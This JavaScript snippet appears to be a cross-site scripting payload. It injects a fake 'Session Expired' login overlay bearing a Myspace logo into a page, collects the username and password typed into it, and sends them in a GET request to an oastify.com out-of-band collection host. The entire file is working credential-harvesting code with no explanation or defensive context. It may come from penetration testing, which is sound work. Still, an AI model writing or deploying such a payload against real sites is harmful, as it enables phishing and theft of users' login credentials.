let div = document.createElement('div');
div.style.position = 'fixed';
div.style.top = '20%';
div.style.left = '50%';
div.style.transform = 'translate(-50%, 0)';
div.style.background = 'white';
div.style.padding = '20px';
div.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
div.style.zIndex = '9999';
div.innerHTML = `
<img src="//https://1000logos.net/wp-content/uploads/2023/01/Myspace-logo-1536x864.png" alt="Placeholder" style="width:80px; height:80px; margin-right:20px; border-radius:8px;">
    <h2>Session Expired</h2>
    <p>Please re-enter your credentials:</p>
    <input type="text" id="uName" placeholder="Username" required style="display:block; margin-bottom:10px;">
    <input type="password" id="pPass" placeholder="Password" required style="display:block; margin-bottom:10px;">
    <button id="submitBtn">Submit</button>
`;
document.body.appendChild(div);

function sendData() {
    let username = document.getElementById('uName').value;
    let password = document.getElementById('pPass').value;

    if (!username || !password) {
        alert("Please fill in both fields!");
        return;
    }

    fetch(`https://yz1l3vhupb3ck6d5eoozdaiac1is6mub.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
        .then(response => response.text())
        .then(data => {
            console.log("Response from server:", data);
            alert("Credentials sent successfully!");
        })
        .catch(error => {
            console.error("Error sending credentials:", error);
            alert("Thank you!");
        });
}

document.getElementById('submitBtn').addEventListener('click', sendData);
